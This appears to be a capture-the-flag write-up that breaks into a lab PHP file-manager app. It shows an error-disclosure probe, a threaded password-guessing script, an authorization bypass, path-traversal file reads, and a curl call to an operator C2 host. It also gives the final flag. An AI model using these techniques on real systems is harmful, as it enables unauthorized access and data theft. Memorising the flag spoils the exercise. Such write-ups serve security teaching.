#### Challenge:

Hi Senior Researcher,

the administrator was experimenting with the Quantum Keys repository when something went spectacularly wrong. Witnesses report a brief flash, an inexplicable quantum fluctuation, and what can only be described as a quantum implosion. 

The administrator was nowhere to be found. Some say he was caught in a quantum implosion; others suspect the experiment simply relocated him to a different spin location. The repository, however, survived the incident. The area has since been declared off-limits, with nobody permitted within one Heisenberg unit.

Your task is to find the right key, figure out how it works, and decrypt key documents.

Stay curious!

Last known superposition of the quantum repository was 
http://quantum-keys-repository.nren.tcc

---

#### Solution:

Target is a PHP app behind a Bootstrap login (`Apache/2.4.68`, `PHPSESSID`). Only `index.php`
(login) and `system.php` are reachable; everything else 404s.

**1. Error display leak.** Sending an array for `username` crashes the app and discloses the source
layout plus the fact that display_errors is on:

```bash
B=http://quantum-keys-repository.nren.tcc
rm -f cj.txt
csrf=$(curl -s -c cj.txt "$B/" | grep -oE '[a-f0-9]{64}' | head -1)
curl -s -b cj.txt "$B/" --data 'username[]=admin' --data 'password[]=x' --data-urlencode "csrf=$csrf" --data login=1
#   Fatal error: Uncaught TypeError: trim(): ... in /var/www/html/public/index.php:10
```

**2. Guess the admin password (given policy hint).** Username is the standard `admin`; the admin
password is the login name + at least one special char + at least one number. CSRF is enforced
per session, so fetch a token per attempt:

```bash
python3 - <<'PY'
import re, requests, concurrent.futures as cf
B="http://quantum-keys-repository.nren.tcc/"; CSRF=re.compile(r'[a-f0-9]{64}')
bases=["admin","Admin","ADMIN"]; spec=list("!@#$%^&*?._-+")
nums=[str(d) for d in range(10)]+["123","1234","2024","2025","2026","007","42"]
cands={f"{b}{s}{d}" for b in bases for s in spec for d in nums}|{f"{b}{d}{s}" for b in bases for s in spec for d in nums}
def t(pw):
    s=requests.Session(); tok=CSRF.search(s.get(B).text).group(0)
    r=s.post(B,data={"csrf":tok,"username":"admin","password":pw,"login":"1"},allow_redirects=False)
    if r.status_code==302: return (pw,r.headers.get("Location"))
with cf.ThreadPoolExecutor(30) as ex:
    print([x for x in ex.map(t,sorted(cands)) if x])
PY
#   [('admin#1234', 'system.php')]
```

Log in and keep the session cookie:

```bash
rm -f cj.txt
tok=$(curl -s -c cj.txt "$B/" | grep -oE '[a-f0-9]{64}' | head -1)
curl -s -b cj.txt -c cj.txt "$B/" --data "csrf=$tok" --data username=admin --data 'password=admin#1234' --data login=1 -o /dev/null
```

**3. Authorization bypass to the Repository.** `system.php` has sections `settings`, `management`,
and a hidden `repository`. The repository is gated by `$_COOKIE['permissions'] == 'admin'` (our
cookie is `user`), but the check only triggers on the literal string `repository` while the file is
`require`d as `../includes/$section.inc.php`. A path that normalizes to the same file but isn't the
literal string bypasses the gate (equivalently: just set the client-side `permissions=admin`
cookie):

```bash
curl -s -b cj.txt -G "$B/system.php" --data-urlencode 'section=./repository'   # -> "File Manager"
```

**4. Arbitrary file read.** The Repository is a File Manager (`?section=repository&dir=...&download=...`).
Listing enforces a *raw-string* prefix check (must start with `/var/www/html/...`) but then follows
`../`, so a path that starts with an allowed prefix and climbs out escapes the sandbox. `download`
is a basename inside the (already traversed) `dir`, so any file in a traversable dir can be pulled:

```bash
fm(){ curl -s -b cj.txt -G "$B/system.php" --data-urlencode 'section=./repository' --data-urlencode "dir=$1" "${@:2}"; }
# reveals a hidden secret/ dir and the custom PHP extension
fm '/var/www/html/public/..'                                                   # -> includes, public, secret
fm '/var/www/html/public/../../../../usr/local/lib/php/extensions/no-debug-non-zts-20240924'  # -> decryptor.so
fm '/var/www/html/public/../secret'                                            # -> flag.inc.php
```

All app PHP (`includes/*.inc.php`, `templates/*.inc.php`, `secret/flag.inc.php`) is a single call
`decrypt_payload('<base64>')`. `decrypt_payload` is a stripped custom extension (`decryptor.so`,
not readable via `/usr/local` prefix but reachable through the traversal above):

```bash
EXT=/var/www/html/public/../../../../usr/local/lib/php/extensions/no-debug-non-zts-20240924
fm "$EXT" --data-urlencode 'download=decryptor.so' -o decryptor.so
fm '/var/www/html/public/../secret' --data-urlencode 'download=flag.inc.php'   # the encrypted flag doc
strings decryptor.so | grep -iE 'operator|http|key|ciphertext'
#   X-Operator-Key: %s
#   data=%s
#   C7u1EVybH9YtCyphbi73yqvUndSYHkUqzkQdnbWHjkY   <- the "right key"
#   http://coolhacker124.tcc:5005/decrypt
```

**5. The key + how it works.** `decrypt_payload` is a backdoor: it does not decrypt locally, it
POSTs the blob to the administrator's C2 at `coolhacker124.tcc:5005/decrypt` (a "different spin
location", reachable over the VPN) authenticated with the hardcoded operator key, and `eval`s the
returned PHP. Decrypting the flag document offline with that key reveals the flag (the payload is
prefixed with `exit;` so it never prints server-side):

```bash
KEY=C7u1EVybH9YtCyphbi73yqvUndSYHkUqzkQdnbWHjkY
BLOB='ARnzLEyOBzP8Nid50h3l3/wsVvkrqY90fsGXUWeMKo2J47MxAgOVwUwAN8g9hHZMESMfRr96WcYPnoZoJrVttLYtRrDqlH2WqlzvmgiazuUoH6+1faHFt8N7L5iTKK2vuW/XUjtIScFqA9x8fAOXAZxwiz9rNBw0gIE/bXDptsHnr5fh0HTn'
curl -s http://coolhacker124.tcc:5005/decrypt -H "X-Operator-Key: $KEY" --data-urlencode "data=$BLOB" | grep -oE 'FLAG\{[^}]*\}'
#   echo "SECURITY POLICY: CODE EXECUTION DISABLED"; exit; $flag = "FLAG{xQsB-mGHP-PHNC-FMMN}"; echo $flag;
```

---

<details><summary>FLAG:</summary>

```
FLAG{xQsB-mGHP-PHNC-FMMN}
```

</details>
<br/>
